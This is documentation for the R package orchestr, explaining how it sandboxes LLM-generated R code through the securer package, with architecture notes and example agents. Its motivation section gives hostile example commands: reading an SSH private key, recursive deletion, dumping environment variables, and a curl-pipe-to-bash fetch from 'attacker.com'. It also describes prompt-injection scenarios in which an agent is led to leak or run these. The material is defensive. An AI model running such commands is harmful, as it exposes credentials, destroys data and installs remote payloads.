# Secure Execution with securer

## Why sandboxed execution?

When an LLM agent generates and executes R code, it runs arbitrary code
on your machine. A human applies judgment about what is safe to run. The
model does not, and worse, it can be manipulated.

Consider these attack scenarios:

- Data exfiltration: A prompt injection in a user-uploaded CSV causes
  the agent to run `readLines("~/.ssh/id_rsa")` and include the contents
  in its response. The user’s private key is now in the LLM provider’s
  logs.

- Filesystem destruction: The agent encounters an error and decides to
  “clean up” by running `unlink("/data/reports", recursive = TRUE)`. A
  momentary hallucination just deleted your production data.

- Credential theft: The model runs
  [`Sys.getenv()`](https://rdrr.io/r/base/Sys.getenv.html) to “debug” a
  connection issue, exposing every environment variable (API keys,
  database passwords, cloud credentials) in its output.

- Lateral movement: The agent calls
  `system("curl attacker.com/payload | bash")` to install a “helpful
  package” that a prompt injection suggested.

These are not hypothetical. Any system that executes LLM-generated code
without sandboxing is vulnerable. The
[securer](https://github.com/ian-flores/securer) package provides
OS-level sandboxing so that generated code cannot access the filesystem,
network, or system resources beyond what you explicitly allow.

orchestr integrates with securer through the `secure = TRUE` flag on
[`agent()`](https://ian-flores.github.io/orchestr/reference/Agent.md).
Here is how orchestr and securer interact:

     +------------------+       tool call       +------------------+
     |    orchestr      | -------------------> |     securer       |
     |  (agent graph)   |                      |  (sandbox child)  |
     |                  |       result         |                   |
     |  Parent R proc   | <------------------ |  Isolated R proc  |
     +------------------+        UDS           +------------------+
                                                |  Seatbelt (mac)  |
                                                |  bwrap (linux)   |
                                                |  env-only (win)  |
                                                +------------------+

The parent orchestr process sends tool calls over a Unix domain socket
(UDS) to a child R process that runs inside an OS sandbox. The child can
only access what the sandbox policy allows. Results flow back through
the same socket. If the child attempts a forbidden operation, the OS
blocks it.

## Installation

``` r
install.packages(c("securer", "orchestr"))
```

## Creating a secure agent

The `secure = TRUE` and `sandbox = TRUE` flags on
[`agent()`](https://ian-flores.github.io/orchestr/reference/Agent.md)
tell orchestr to route tool execution through a securer `SecureSession`.
You define tools as usual; the sandboxing is transparent to the tool
implementation.

``` r
library(orchestr)
library(ellmer)
library(securer)

# Define a tool that runs R code in a sandbox
code_tool <- securer_tool(
  name = "run_code",
  description = "Execute R code in a sandboxed environment.",
  args = list(code = "character"),
  handler = function(code) {
    eval(parse(text = code))
  }
)

# Create an agent with sandboxed execution
secure_agent <- agent("code-runner",
  chat = chat_anthropic(
    system_prompt = paste(
      "You are a data analysis assistant.",
      "Use the run_code tool to execute R code.",
      "Always show your work."
    )
  ),
  tools = list(code_tool),
  secure = TRUE,
  sandbox = TRUE
)

# The agent can now safely execute LLM-generated code
result <- secure_agent$invoke("Calculate the mean of c(1, 5, 3, 7, 2) in R.")
cat(result)

# Always close when done to clean up the securer session
secure_agent$close()
```

## What the sandbox restricts

When `sandbox = TRUE`, the child R process runs inside an OS sandbox:

- macOS: Seatbelt profile via `sandbox-exec`. Blocks filesystem writes
  outside temp, network access, and process spawning.
- Linux: Bubblewrap (`bwrap`) namespace isolation. Blocks filesystem,
  network, and IPC outside the sandbox.
- Windows: Environment isolation (clean HOME, TMPDIR, R_LIBS_USER). No
  filesystem or network restrictions without admin privileges.

The sandbox operates at the OS level, catching
[`system()`](https://rdrr.io/r/base/system.html) calls, compiled code,
and any R package that attempts forbidden operations. Kernel enforcement
is strictly stronger than R-level sandboxing that relies on function
blacklists.

## Mixing secure and regular tools

Not every tool needs a sandbox. An agent might need both a sandboxed
code execution tool (untrusted, LLM-generated code) and a regular API
lookup tool (trusted code that you wrote). orchestr tells
[`securer_tool()`](https://ian-flores.github.io/securer/reference/securer_tool.html)
instances apart from regular
[`ellmer::tool()`](https://ellmer.tidyverse.org/reference/tool.html)
instances.

When an agent has both types, securer tools run in the sandboxed child
process while regular tools execute in the parent process. Untrusted
code stays isolated; trusted code keeps full access to the network and
filesystem.

``` r
# Regular tool -- runs in the parent process, no sandbox
weather_tool <- tool(
  function(city) paste0("Weather in ", city, ": sunny, 22C."),
  "Get weather for a city.",
  arguments = list(city = type_string("City name"))
)

# Securer tool -- runs in the sandboxed child process
calc_tool <- securer_tool(
  name = "calculate",
  description = "Run a calculation in R.",
  args = list(expr = "character"),
  handler = function(expr) eval(parse(text = expr))
)

hybrid_agent <- agent("hybrid",
  chat = chat_anthropic(
    system_prompt = "You can check weather and do calculations."
  ),
  tools = list(weather_tool, calc_tool),
  secure = TRUE
)

# The weather tool runs in-process; the calculate tool runs sandboxed
result <- hybrid_agent$invoke("What is 2^10? Also, what's the weather in London?")
hybrid_agent$close()
```

## Using secure agents in graphs

Secure agents work the same as regular agents inside any graph type.
Sandboxing operates at the tool execution layer, so the graph runtime is
unaware of it. You can mix secure and non-secure agents in the same
pipeline or supervisor graph.

``` r
analyst <- agent("analyst",
  chat = chat_anthropic(
    system_prompt = "You are a data analyst. Use run_code to compute answers."
  ),
  tools = list(code_tool),
  secure = TRUE
)

graph <- react_graph(analyst)
result <- graph$invoke(list(
  messages = list("What is the standard deviation of c(10, 20, 30, 40, 50)?")
))

analyst$close()
```

You can also use
[`pipeline_graph()`](https://ian-flores.github.io/orchestr/reference/pipeline_graph.md)
and
[`supervisor_graph()`](https://ian-flores.github.io/orchestr/reference/supervisor_graph.md)
with secure agents. Use `verbose = TRUE` on `compile()` or `$invoke()`
to trace execution flow:

``` r
result <- graph$invoke(
  list(messages = list("Compute the correlation between mpg and wt in mtcars.")),
  verbose = TRUE
)
```

## Next steps

- [Getting
  started](https://ian-flores.github.io/orchestr/articles/quickstart.md):
  single-agent basics and provider setup
- [Multi-agent
  workflows](https://ian-flores.github.io/orchestr/articles/multi-agent.md):
  pipelines and supervisors
- [Traced
  workflows](https://ian-flores.github.io/orchestr/articles/tracing.md):
  observability with securetrace
- [Governed
  agent](https://ian-flores.github.io/orchestr/articles/governed-agent.md):
  the full 7-package stack
